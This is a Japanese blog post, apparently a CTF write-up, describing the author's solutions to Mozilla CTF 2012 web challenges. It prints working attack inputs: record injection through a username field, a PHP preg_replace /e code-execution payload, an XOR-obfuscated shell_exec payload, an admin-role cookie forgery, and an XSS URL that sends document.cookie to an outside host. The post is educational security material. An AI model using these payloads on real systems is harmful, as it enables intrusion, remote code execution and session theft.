@@ -1,0 +1,214 @@
+===============================
+Mozilla CTF 2012 に参戦しました
+===============================
+
+:date: 2012-02-13 12:00:31
+:slug: blog-24
+
+2012/01/25 (日本時間では 17 時からの 24 時間) に開催された `Mozilla CTF <https://wiki.mozilla.org/Security/Events/CTF>`_ に参加してきました。
+
+このエントリが 2 週間後の投稿になってしまったのは、モンハン 3G で忙しかったからです。モンハン楽しいですね！　初モンハンでしたが村クエ全部クリアしてやっと初心者脱出かなというところです。　いま HR 44 です！　今度誰か一緒に狩りに行きませんか！　そんな話はどうでもいいですね！
+
+さて、 CTF とはなんぞやという方は「 `プレイ・ザ・ゲーム！ CTFが問いかけるハックの意味 － ＠IT <http://www.atmarkit.co.jp/fsecurity/rensai/dknight01/dknight01.html>`_ 」をご覧いただくといいと思います。
+
+CTF はこれがはじめてだったんですが、腕試しくらいの軽い気持ちで思い切って単身で参戦しました。
+
+別作業しながらの参戦だし、開催中も普通に 8 時間ほどガッツリ睡眠取ってたのですが、スコアボードを見てみると 33 位 (1700 Points) でした。 `Web Application Security » Blog Archives » Mozilla CTF 2012 – Aftermath <https://blog.mozilla.com/webappsec/2012/01/31/after-mozilla-ctf2012/>`_ によると、 1 問以上解いたチームが 119 チームだったということなので、そこそこ健闘できたかなと思います。
+
+.. image:: 
+    http://co3k.org/image/uploaded/co3k_mozilla_ctf_score.png
+
+非常に楽しかったので次回があったら是非また参戦したいです！　日本人で参戦したのが海老原一人っぽくて結構寂しかったので、興味がある方は次回いかがですか。
+
+海老原が解いた問題は以下となります。 Web 系以外の問題では戦えないと判断し、今回は避けることにしました。（ちょっと悔しいので、今回避けたような種類（バイナリ系とか暗号解読系とか）の問題にも手を出せるようになるため、こっそり勉強をはじめました＞＜）
+
+* 2 - Buoy (250)
+* 11 - Spark - Message in a Bottle (200) (ページに隠されたメッセージを読み取る問題。 `Tilt <http://techcovered.blogspot.com/2012/02/firefox-11-has-tilt-integrated.html>`_ を使えばすぐにわかる。サービス問題かな)
+* 16 - Sharkpedia (400)
+* 19 - Fishr - Fish your messages out of the sea (500)
+* 20 - Dory's Language School (300)
+* 22 - Swimsuit up! (evaluated) (海っぽい格好をした写真を Twitter 上にアップするサービス問題。海老原の画像は https://twitter.com/#!/co3k/status/162230520099512322)
+
+ということでこれらの問題の海老原の答えをいくつか載せようと思ったのですが……どうも次の開催まで CTF のサイトは閉鎖するようです。問題はしばらく一般公開されるものだと思っていたので、ちょっと残念です。今回解けなかった問題にも改めてチャレンジしたかったのに……。
+
+とりあえず、どういう問題が出たのかわかるように、問題と解法に関する簡単なメモだけ残しておきます。他の参加者の Write-Up は `Security/Events/CTF/WriteUp2012 - MozillaWiki <https://wiki.mozilla.org/Security/Events/CTF/WriteUp2012>`_ にて公開されているので、興味がある方はこちらもお読みください。
+
+2 - Buoy
+========
+
+Buoy という Web アプリケーションにアクセスし、サーバ上の ``/home/buoy/private.key`` の内容を答える問題です。
+
+この問題は PHP のソースコードが配布されています。提供されたコードを斜め読みしたところ、 ``modules/read.php`` に任意 PHP コード実行の脆弱性があることが確認できました。
+
+このスクリプトの脆弱な箇所を実行するためには認証が必要なのですが、アカウント情報は特に何も配布されていませんでした。なので、まずこの認証を突破する必要があります。
+
+ということでそのあたりのコードを読んだところ、登録処理に脆弱性があることがわかりました。 Buoy には「オープン」と「クローズ」のふたつの登録モードと、新規アカウントのアクティベーションモードとして「自動」と「手動」が存在するようでした。
+
+このサイトでは「クローズ」な登録モードと「手動」のアクティベーションモードが有効になっているようでしたが、先の脆弱性によってこの制限を回避することができました。
+
+登録処理は ``modules/register.php`` によっておこなわれていました::
+
+    funciton register( $username, $password )
+    {
+        $handle = @fopen( '/tmp/users.db', 'a' );
+
+        // *snip*
+
+        fwrite( $handle, $username . ';' . md5( $password ) . ';' . ( $auto_enable_accounts ? '1' : '0' ) . ';' . "\n" );
+
+        // *snip*
+    }
+
+    if( isset( $_REQUEST['username'] ) && isset( $_REQUEST['password'] ) )
+    {
+        // *snip*
+
+        if( register( $_REQUEST['username'], $_REQUEST['password'] ) )
+        {
+            // *snip*
+        }
+    }
+    // *snip*
+
+このスクリプトはリクエストパラメータから得た新規アカウント情報を DB に書き込みます。
+
+本来、このスクリプトはフロントコントローラ経由で読み込まれることが想定されていて、「クローズ」な登録モードでは読み込まれることはありません。また、配布されたソースコードの ``.htaccess`` にて ``modules`` ディレクトリへのブラウジングが禁止されていて、ファイルに直接アクセスすることもできません。ところが、稼働しているサイトではこの ``.htaccess`` の制限が外れていた（おそらく設定ミスをしたという想定なのでしょう）ため、このスクリプトを直接実行することができる状態でした。
+
+まず、 ``/modules/register.php?username=co3k&password`` に GET し、アカウントを作成し、そのアカウントを使ってログインを試みようとしました。ところが、実際に書き込まれたレコードは以下のようになっていたために成功しませんでした::
+
+    co3k;5f4dcc3b5aa765d61d8327deb882cf99;0;
+
+最後のフィールドはアカウントが有効か否かを表すフラグです。 Buoy は無効な co3k アカウントを拒否したのでしょう。
+
+``$_REQUEST['username']`` はエスケープ処理を欠いているので、今度は ``username=ebihara;5f4dcc3b5aa765d61d8327deb882cf99;1;%0A&password=password`` を試すことにしました。
+
+これで、スクリプトは以下の不正なレコードを書き込むことになりました::
+
+    ebihara;5f4dcc3b5aa765d61d8327deb882cf99;1;
+    ;5f4dcc3b5aa765d61d8327deb882cf99;0;
+
+晴れて ebihara / password という正当なアカウントを手に入れ、ログインすることができました。
+
+さて、それではメインの脆弱性の突破に移ります。 ``modules/read.php`` を読むと、以下の行の存在に気がつくはずです::
+
+    $message = preg_replace( '/\[lc\](.*?)\[\/lc\]/ie', 'strtolower("$1")', $message );
+
+``e`` 修飾子 ( ``$message`` を第二引数で指定したコードの実行結果で置き換える) と二重引用符で囲まれた文字列という、なんとも狙い所のあるコードであることがわかります。
+
+PHP は二重引用符で囲まれた文字列での PHP ステートメントの記述を許しています。そこで、 ``[lc]{${(var_dump(file_get_contents($_GET[0])))}}[/lc]`` というメッセージを投稿し、このメッセージを表示させるページに ``&0=/home/buoy/private.key`` をリクエストパラメータに含んだ上でアクセスしました。
+
+その結果、 ``preg_replace()`` は ``var_dump(file_get_contents('/home/buoy/private.key'))`` を実行し、この問題の答えを出力することになりました。
+
+ちなみに、 2/4 に `PHP: rfc:remove_preg_replace_eval_modifier [PHP Wiki] <https://wiki.php.net/rfc/remove_preg_replace_eval_modifier>`_ という RFC が PHP の Wiki に提案されています。 ``e`` 修飾子は危険だし ``preg_replace_callback()`` で容易に代替可能だしで誰得だから削除しないかという提案ですね。僕もこの提案には賛同します。ソースコードを検査して脆弱な箇所を探すにしても、 ``e`` 修飾子は ``eval()`` と違って若干探しにくいですからね。
+
+なお、ここでは攻撃コード例として ``<h1>{${eval($_GET[php_code])}}</h1>`` が挙げられていました。この問題に対する僕の回答もこれで充分でしたね。
+
+16 - Sharkpedia
+===============
+
+このサイトの公開ディレクトリにある隠されたファイルを見つけ出す問題です。
+
+リクエストパラメータ ``p`` の値に応じて、様々なサメの写真を表示するサイトのようでした。トップページにはいくつかリンクが用意されており、 URL はそれぞれ ``?p=a`` 、 ``?p=b`` 、 ``?p=c`` のパラメータが付加された ``index.php`` となっています。 ``p`` パラメータにこれら以外の値を指定すると、トップページが表示されます。
+
+ところが、 ``?p='`` パラメータ付きでアクセスしてみると、 Fatal error となることに気がつきました。そのときのエラーメッセージは以下です::
+
+    Fatal error: Function name must be a string in /usr/local/www/apache22/data/index.php on line 101
+
+妙なメッセージですね。仮に関数名が  ``p`` パラメータから構築されていたとしても、このようなエラーメッセージにはならないはずです。
+
+そこで、今度は ``?p='.'`` 付きでアクセスしてみると、正常なページが何のエラーもなく表示されました。この結果からまず、 ``p`` パラメータが文字列によって動的に構築される PHP コード中の文字列定数内に反映されてることがわかります。そして、値として ``'`` を指定した場合に ``Function name must be ...`` というエラーが出力されるということは、 ``create_function()`` により関数を構築しようとしているが、 ``'`` を与えた場合に PHP の構文が壊れるため、 ``create_function()`` が ``false`` を返し、その ``false`` を関数名として扱おうとしてエラーになったのだと推測することができます。
+
+「ああ、これは簡単だわ」と考え、 ``?p='.phpinfo().'`` を試してみると、 ``phpinfo()`` の結果が……出力されず、トップページが表示されました。
+
+どうやら ``p`` パラメータには、アルファベットは 1 つのみ受け入れたり、 ``_`` を拒否するなどといった制約があるようです。
+
+しかしみなさんご存じの通り、 PHP はアルファベットや数字を使わずに書くことができます。どんな文字もビット演算によって生成できますし、変数名には 0x7f 以降の文字も使用できます（ひらがなとかも通る）。
+
+ということで最終的には、以下の値を ``p`` パラメータに記述しました::
+
+    a%27.%28$%E3%81%82=%27[@@@@%60@[@%23%27^%27%28%28%,,?%%23%@%27%29.%28$%E3%81%84=%27@[%27^%27,%28%27%29.%28$%E3%81%82%28$%E3%81%84%29%29.%27
+
+URL デコード済みの文字列は以下となります::
+
+    a'.($あ='[@@@@`@[@#'^'((%,,?%#%@').($い='@['^',(').($あ($い)).' 
+
+さらにこれをビット演算した結果が以下となります::
+
+    a'.($あ='shell_exec').($い='ls').($あ($い)).'
+
+これによってサーバ上で ``ls`` コマンドが実行されることとなり、隠れたファイルが白日の下に晒されました。
+
+19 - Fishr - Fish your messages out of the sea
+==============================================
+
+Twitter っぽい Web アプリケーションで、提供されたアカウントから見ることのできない flagdud3 のプライベートなメッセージを読み取る問題です。
+
+いくつかサイトを見て回ったあと、 JSON をレスポンスする ``/ajax.php?p=wall&arg=admin`` に cookie なしで GET してみると、以下のメッセージが出力されました::
+
+    Notice: Undefined index: data in /usr/local/www/apache22/data/inc/wall.inc on line 10
+    Notice: Undefined offset: 1 in /usr/local/www/apache22/data/inc/util.inc on line 28
+    Notice: Undefined offset: 2 in /usr/local/www/apache22/data/inc/util.inc on line 29 
+
+なにげなく ``/inc`` にアクセスすると、ディレクトリリスティングが有効になっているために、 PHP スクリプトの一覧が出力されることになりました。
+
+そしてなんと、 ``*.inc`` ファイルについてはスクリプトの内容がブラウザから読めてしまいます。
+
+さっそくウォールの出力を担当していると思われる ``/inc/wall.inc`` を見てみると、以下のようなコードがありました::
+
+    if ($resUser['private'] != 1 || $resUser['name'] == $user['name'] || $user['role'] == 'admin' || is_following_you($resUser['id'], $user['id'])) {
+
+プライベートなウォールを読むには、そのユーザ自身か、管理者、もしくはフォロワーになる必要があるようですね。
+
+``$user`` は ``get_login_info()`` から得られたものです。この関数は ``/inc/util.inc`` にて定義されています::
+
+    function get_login_info($data) {
+        $data = explode(':', $data);
+        $user = array(
+            'id'    => urldecode($data[0]),
+            'name'  => urldecode($data[1]),
+            'email' => urldecode($data[2]),
+            'role'  => (count($data) > 3) ? $data[3] : 'user'
+        );
+        return $user;
+    }
+
+``$data`` は cookie から来た値で、提供されたアカウントでログインしたときの値は ``7:0wn:0wn@40spam.com`` でした。
+
+そこで ``role`` の部分が ``admin`` であるときの挙動を確認するために ``7:0wn:0wn@40spam.com:admin`` を cookie にセットしてみると、なんと flagdud3 のウォールが見えてしまいました。
+
+以下のコードを見て、 ``SECRET`` 定数の値も破る必要があると思っていたので、ちょっと拍子抜けでした::
+
+    function is_logged_in() {
+        // SECRET of settings.py (32 chars)
+        return (!empty($_COOKIE['data']) && !empty($_COOKIE['mac']) && md5(SECRET . urldecode($_COOKIE['data'])) == $_COOKIE['mac']);
+    }
+
+20 - Dory's Language School
+===========================
+
+ページ上にある XSS を利用し、その XSS を発動させる URL を踏ませ、 Cookie に含まれるメッセージを盗み出す問題（URL は MozillaCTF の Twitter アカウントに DM で送信し、中の人に踏んでもらう）ですが、 XSS 脆弱性はすぐ見つかります。脆弱な場所は以下です::
+
+    var lang = ''; var country = '';
+
+これらの変数の値はリクエストパラメータ ``language`` から来たものです（なぜか最初の 1 文字が取り除かれますが）。ただ、この値を使って攻撃をおこなうとすると、いくつか問題を回避する必要が出てきます。
+
+* ``'`` は Unicode エスケープシーケンスに置換される
+* 数値以外の文字がこの変数に存在すると、スクリプトが "attack detected" というアラートを出す。おそらく被害者がアラートを見たらブラウジングを中断する想定なのでしょう
+* 文字数制限が存在する
+
+また、コードはいくつか難読化が施されていました。難読化されたコードを読み解いていくと ``eval()`` が ``_()`` として定義されていて、 ``protect()`` という関数でアラートを出していることがわかりました。
+
+ということで以下の exploit を作成しました（ちょうどこれがギリギリ入るくらいの文字数制限が施されていました）::
+
+    http://example.com/?language=a;_(location.hash.substr(1))//\#protect=focus;location.href="http://co3k.org/?ctf="+document.cookie;
+
+これで、以下の JavaScript が挿入されました::
+
+    var lang = '_(location.hash.substr(1))//\'; var country = ' // ここまで文字列定数
+    _(location.hash.substr(1))//\
+
+``_()`` 、 つまり ``eval()`` を用いて、フラグメント識別子の ``#`` の後ろに続く文字列を ``JavaScript`` として実行するようにし、文字列制限を気にせずに任意のコードが書けるようにしました。
+
+フラグメント識別子に書かれたコードでは、まず ``protect()`` を ``window.focus()`` に置き換えることで、攻撃の存在に気がつかれないようにし、 ``document.cookie`` をパラメータにつけて自分のサイトに送信しています。
+
+あとはこの URL を @MozillaCTF に送りつけ、アクセスログに答えが舞い込んでくるのを待てばいいということになります。
